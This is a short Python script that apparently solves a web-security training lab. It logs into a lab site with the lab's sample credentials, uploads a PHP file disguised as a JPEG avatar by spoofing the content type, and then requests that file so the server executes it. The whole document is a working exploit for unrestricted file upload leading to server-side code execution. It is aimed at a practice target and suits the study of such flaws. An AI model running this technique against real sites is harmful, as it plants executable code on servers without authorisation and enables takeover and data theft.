import requests
from bs4 import BeautifulSoup

s = requests.Session()

# GET - login
url = "https://0a3f007503c3e4b982acb6e000070064.web-security-academy.net/"
response = s.get(f"{url}login")
soup = BeautifulSoup(response.text, "html.parser")
csrf = soup.find("input", {"name": "csrf"})["value"]
print(csrf)

# POST - login
data = {
    "csrf": csrf, 
    "username": "wiener", 
    "password": "peter"
}
response = s.post(f"{url}login", data=data)
soup = BeautifulSoup(response.text, "html.parser")
csrf = soup.find("input", {"name": "csrf"})["value"]
print(csrf)

# POST - upload avatar
files = {
    "avatar": (
        "payload_1.php", 
        open("payload_1.php", "rb"),
        "image/jpeg"
    )
}
data = {
    "user": "wiener",
    "csrf": csrf
}
response = s.post(f"{url}my-account/avatar", files=files, data=data)
print(response.text)

# GET - payload
r = s.get(f"{url}files/avatars/payload_1.php")
print(r.text)